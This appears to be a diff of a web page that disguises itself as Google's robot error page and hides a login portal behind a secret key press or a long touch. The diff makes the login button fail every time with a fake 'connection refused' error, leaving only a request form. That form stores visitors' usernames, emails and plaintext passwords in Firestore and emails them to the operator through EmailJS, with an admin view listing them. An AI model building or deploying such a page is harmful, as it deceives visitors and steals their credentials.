@@ -26,19 +26,20 @@
         * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
         body { background: #fff; color: #222; overflow: hidden; height: 100vh; font-family: 'Segoe UI', sans-serif; }
 
-        /* DECOY */
-        #decoy-layer { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; cursor: default; user-select: none; }
+        /* DECOY LAYER */
+        #decoy-layer { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; cursor: default; user-select: none; touch-action: none; }
         .g-container { max-width: 650px; width: 100%; }
         .g-robot { background: url('https://www.google.com/images/errors/robot.png') no-repeat; width: 256px; height: 256px; float: right; }
         .g-text h1 { font-size: 18px; font-weight: normal; color: #202124; margin: 0 0 15px; }
 
-        /* AUTH */
+        /* AUTH OVERLAY */
         #auth-overlay { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 10000; align-items: center; justify-content: center; }
         .auth-card { width: 400px; padding: 40px; background: var(--glass); border: 1px solid var(--border); border-radius: 28px; backdrop-filter: blur(25px); text-align: center; color: #fff; }
         input { width: 100%; padding: 14px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: 14px; color: #fff; }
-        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 14px; background: linear-gradient(135deg, var(--accent), var(--accent-2)); color: white; font-weight: 700; cursor: pointer; }
+        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 14px; background: linear-gradient(135deg, var(--accent), var(--accent-2)); color: white; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
+        .btn-main:disabled { opacity: 0.8; cursor: not-allowed; }
 
-        /* PORTAL */
+        /* PORTAL INTERFACE */
         #portal-interface { display: none; position: fixed; inset: 0; flex-direction: column; background: var(--bg); color: #fff; }
         #top-nav { height: 75px; background: rgba(0,0,0,0.4); display: flex; align-items: center; padding: 0 30px; border-bottom: 1px solid var(--border); }
         .nav-logo { font-size: 20px; font-weight: 900; color: var(--accent); }
@@ -104,8 +105,6 @@
     </div>
 
     <script type="module">
-        console.log("Script Loading...");
-
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -123,22 +122,56 @@
             const app = initializeApp(firebaseConfig);
             const auth = getAuth(app);
             const db = getFirestore(app);
-            console.log("Firebase Connected");
 
-            // Bypass (5s Hold)
-            let hold;
             const decoy = document.getElementById('decoy-layer');
-            decoy.onmousedown = () => hold = setTimeout(() => {
-                decoy.style.display = 'none';
-                document.getElementById('auth-overlay').style.display = 'flex';
-            }, 5000);
-            decoy.onmouseup = () => clearTimeout(hold);
+            const authOverlay = document.getElementById('auth-overlay');
 
-            // Tabs
+            // --- BYPASS FUNCTION ---
+            const unlockSystem = () => {
+                decoy.style.display = 'none';
+                authOverlay.style.display = 'flex';
+            };
+
+            // 1. TOUCH BYPASS (5s Hold)
+            let touchTimer;
+            decoy.addEventListener('touchstart', (e) => {
+                if(e.cancelable) e.preventDefault(); // Stop context menu
+                touchTimer = setTimeout(unlockSystem, 5000);
+            }, { passive: false });
+
+            decoy.addEventListener('touchend', () => clearTimeout(touchTimer));
+            decoy.addEventListener('touchmove', () => clearTimeout(touchTimer));
+
+            // 2. GLOBAL KEY BYPASS (Press 'g')
+            window.addEventListener('keydown', (e) => {
+                if (e.key.toLowerCase() === 'g') {
+                    unlockSystem();
+                }
+            });
+
+            // --- FAULTY CONNECT BUTTON ---
+            document.getElementById('login-btn').onclick = function() {
+                const btn = this;
+                const originalText = btn.innerText;
+                
+                btn.style.background = 'var(--danger)';
+                btn.innerText = "CONNECTION REFUSED...";
+                btn.disabled = true;
+
+                setTimeout(() => {
+                    btn.style.background = '';
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                    alert("System Error: Handshake timeout. Protocol 0x8842 failed.");
+                }, 2000);
+            };
+
+            // UI Toggles
             window.toggleAuth = (isReg) => {
                 document.getElementById('login-form').style.display = isReg ? 'none' : 'block';
                 document.getElementById('reg-form').style.display = isReg ? 'block' : 'none';
             };
+
             window.switchTab = (t, el) => {
                 document.querySelectorAll('.view-container').forEach(v => v.classList.remove('active'));
                 document.querySelectorAll('.tab-link').forEach(l => l.classList.remove('active'));
@@ -146,37 +179,22 @@
                 el.classList.add('active');
             };
 
-            // CONNECT BUTTON
-            document.getElementById('login-btn').onclick = async () => {
-                console.log("Connect Clicked");
-                const u = document.getElementById('l-user').value.trim();
-                const p = document.getElementById('l-pass').value;
-                if(!u || !p) return alert("Fill fields");
-
-                const email = u.includes('@') ? u.toLowerCase() : (u + "@mtool.local").toLowerCase();
-                
-                try {
-                    await signInWithEmailAndPassword(auth, email, p);
-                    console.log("Success login");
-                } catch (e) {
-                    alert("Fail: " + e.message);
-                }
-            };
-
-            // REQUEST BUTTON
+            // Request Submission
             document.getElementById('submit-req').onclick = async () => {
                 const n = document.getElementById('r-user').value.trim();
                 const e = document.getElementById('r-email').value.trim();
                 const p = document.getElementById('r-pass').value;
+                if(!n || !e || !p) return alert("All fields required");
+
                 try {
                     await addDoc(collection(db, "requests"), { user: n, email: e, pass: p, time: serverTimestamp() });
                     await emailjs.send("service_06y4hgi", "template_56l2irz", { from_name: n, user_email: e, user_pass: p });
-                    alert("Sent!");
+                    alert("Request Sent!");
                     window.toggleAuth(false);
                 } catch (err) { alert(err.message); }
             };
 
-            // ADMIN Monitor
+            // Admin Logic
             function loadAdmin() {
                 onSnapshot(query(collection(db, "requests"), orderBy("time", "desc")), (snap) => {
                     const list = document.getElementById('request-list');
@@ -192,7 +210,7 @@
             }
             window.delDoc = (id) => deleteDoc(doc(db, "requests", id));
 
-            // Auth Check
+            // State Observer
             onAuthStateChanged(auth, (user) => {
                 if(user) {
                     document.getElementById('auth-overlay').style.display = 'none';
@@ -205,8 +223,7 @@
             });
 
         } catch (fatal) {
-            console.error("FATAL SCRIPT ERROR:", fatal);
-            alert("Script crashed! Check console.");
+            console.error("System Failure:", fatal);
         }
     </script>
 </body>
